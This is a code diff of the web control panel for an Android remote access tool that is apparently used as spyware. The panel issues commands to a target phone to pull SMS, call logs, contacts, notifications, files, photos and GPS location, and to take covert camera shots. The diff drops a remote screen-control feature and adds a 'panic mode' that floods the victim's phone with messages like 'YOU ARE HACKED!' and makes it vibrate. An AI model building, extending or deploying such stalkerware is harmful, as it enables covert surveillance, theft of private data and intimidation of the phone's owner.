@@ -32,7 +32,6 @@
         .gal-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px, 1fr)); gap:10px; }
         .gal-item img { width:100%; height:100px; object-fit:cover; border-radius:10px; border:1px solid var(--primary); }
         @media (max-width:700px) { .app-container { grid-template-columns:1fr; } }
-        #screen-view { width:100%; max-width:320px; aspect-ratio:9/16; background:#000; margin:0 auto; display:block; border:5px solid #333; border-radius:20px; cursor:crosshair; }
     </style>
 </head>
 <body>
@@ -81,45 +80,64 @@
             document.getElementById('modal-title').innerText = t.toUpperCase();
             
             if(t === 'open_url') {
-                document.getElementById('modal-body').innerHTML = `<p style="margin-bottom:10px; color:var(--dim)">Target Link:</p><input id="ourl" value="https://google.com">`;
+                document.getElementById('modal-body').innerHTML = `<p>Target Link:</p><input id="ourl" value="https://google.com">`;
                 document.getElementById('modal-footer').innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
+                return;
+            } else if(t === 'vibrate') {
+                document.getElementById('modal-body').innerHTML = `<p>Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
+                document.getElementById('modal-footer').innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">START VIBRATE</button>`;
+                return;
+            } else if(t === 'panic') {
+                document.getElementById('modal-body').innerHTML = `
+                    <p style="margin-bottom:5px;">Duration (Seconds):</p>
+                    <input type="number" id="psec" value="30" style="margin-bottom:15px;">
+                    <p style="margin-bottom:5px;">Chaos Messages:</p>
+                    <div id="p-msgs">
+                        <input class="p-msg" value="YOU ARE HACKED!" style="margin-bottom:5px;">
+                        <input class="p-msg" value="SYSTEM FAILURE" style="margin-bottom:5px;">
+                    </div>
+                    <button onclick="addPMsg()" style="background:#222; color:var(--primary); margin-top:5px; width:100%">+ ADD MESSAGE</button>
+                `;
+                document.getElementById('modal-footer').innerHTML = `<button class="red-btn" style="width:100%" onclick="startPanic()">🔥 ACTIVATE PANIC MODE</button><button onclick="cmd('stop_panic')">STOP</button>`;
                 return;
             }
 
-            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', control:'screenstream on' };
+            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo' };
             if(map[t]) cmd(map[t]);
             render();
+        }
+
+        function addPMsg() {
+            const div = document.getElementById('p-msgs');
+            const inp = document.createElement('input');
+            inp.className = 'p-msg';
+            inp.style.marginBottom = '5px';
+            inp.placeholder = 'Next scary message...';
+            div.appendChild(inp);
+        }
+
+        function startPanic() {
+            const sec = document.getElementById('psec').value;
+            const msgs = Array.from(document.querySelectorAll('.p-msg')).map(i => i.value).filter(v => v);
+            cmd('panic ' + sec + '|' + msgs.join('|'));
         }
 
         function closeModal() {
             if(curMod === 'gallery') cmd('exit_gallery');
             if(curMod === 'filemanager') cmd('exit_shell');
-            if(curMod === 'control') cmd('screenstream off');
             document.getElementById('modal').style.display = 'none'; curMod = null;
-        }
-
-        function handleTap(e) {
-            if(curMod !== 'control') return;
-            const rect = e.target.getBoundingClientRect();
-            const x = Math.round(((e.clientX - rect.left) / rect.width) * 480);
-            const y = Math.round(((e.clientY - rect.top) / rect.height) * 854);
-            cmd(`tap ${x} ${y}`);
         }
 
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
             const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
-            const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || d.screen || "");
+            const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || "");
             
-            if(curMod !== 'contacts' && curMod !== 'control' && hash === curHash) return; 
+            if(curMod !== 'contacts' && hash === curHash) return; 
             hash = curHash;
             b.innerHTML = ""; f.innerHTML = "";
 
-            if(curMod === 'control') {
-                b.innerHTML = `<img id="screen-view" onclick="handleTap(event)" src="${d.screen ? 'data:image/jpeg;base64,'+d.screen : ''}" />
-                               <p style="text-align:center; color:var(--primary); font-size:0.7rem; margin-top:10px;">Accessibility: ON | Click screen to Tap</p>`;
-                f.innerHTML = `<button onclick="cmd('screenstream on')">REFRESH STREAM</button>`;
-            } else if(curMod === 'info') {
+            if(curMod === 'info') {
                 const i = d.info;
                 b.innerHTML = `<div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                     <div class="panel" style="background:#0a1212;">
@@ -130,16 +148,14 @@
                     </div>
                     <div class="panel" style="background:#0a1212; grid-column:1/-1;">
                         <table style="font-size:0.8rem">
-                            <tr><td>SIM 1</td><td style="color:var(--primary)">${i['SIM 1'] || 'N/A'}</td></tr>
-                            <tr><td>SIM 2</td><td style="color:var(--primary)">${i['SIM 2'] || 'N/A'}</td></tr>
-                            <tr><td>WiFi</td><td style="color:var(--secondary)">${i.WiFi || 'N/A'}</td></tr>
-                            <tr><td>Number</td><td>${i.PhoneNumber || 'Unknown'}</td></tr>
+                            <tr><td>WiFi</td><td>${i.WiFi || 'N/A'}</td></tr>
+                            <tr><td>SIM 1</td><td>${i['SIM 1'] || 'N/A'}</td></tr>
+                            <tr><td>Number</td><td>${i.PhoneNumber || 'N/A'}</td></tr>
                         </table>
                     </div>
                 </div>`;
             } else if(curMod === 'contacts') {
-                const contacts = d.contacts || [];
-                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
+                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
             } else if(curMod === 'filemanager') {
                 const fm = d.fm;
                 b.innerHTML = `<div style="background:#0a1212; padding:8px; border-radius:10px; font-family:monospace; font-size:0.75rem; color:var(--primary); margin-bottom:10px;">📂 ${fm.path}</div>
@@ -172,7 +188,7 @@
                     if(curMod) render();
                 }
             } catch(e){}
-            setTimeout(poll, curMod === 'control' ? 500 : 3000);
+            setTimeout(poll, 3000);
         }
 
         function updateMain() {
@@ -182,14 +198,15 @@
             document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
             
             const btns = [
-                {id:'control', i:'fa-display', l:'SCREEN CONTROL'}, {id:'info', i:'fa-circle-info', l:'INFO'},
-                {id:'contacts', i:'fa-address-book', l:'CONTACTS'}, {id:'sms', i:'fa-sms', l:'SMS'},
-                {id:'calls', i:'fa-phone', l:'CALLS'}, {id:'filemanager', i:'fa-folder', l:'FILES'},
-                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
-                {id:'apps', i:'fa-th', l:'APPS'}, {id:'get_location', i:'fa-map-marker-alt', l:'GPS'},
-                {id:'flash', i:'fa-bolt', l:'FLASH'}, {id:'takebackpic', i:'fa-camera', l:'CAM BACK'},
-                {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'}, {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'},
-                {id:'toast', i:'fa-lock', l:'LOCK/MSG'}, {id:'open_url', i:'fa-globe', l:'OPEN URL'}
+                {id:'panic', i:'fa-triangle-exclamation', l:'PANIC TRIGGER'}, {id:'vibrate', i:'fa-mobile-vibration', l:'VIBRATE'},
+                {id:'info', i:'fa-circle-info', l:'INFO'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
+                {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'},
+                {id:'filemanager', i:'fa-folder', l:'FILES'}, {id:'gallery', i:'fa-images', l:'GALLERY'},
+                {id:'notifications', i:'fa-bell', l:'NOTIFS'}, {id:'apps', i:'fa-th', l:'APPS'},
+                {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
+                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
+                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'LOCK/MSG'},
+                {id:'open_url', i:'fa-globe', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
         }
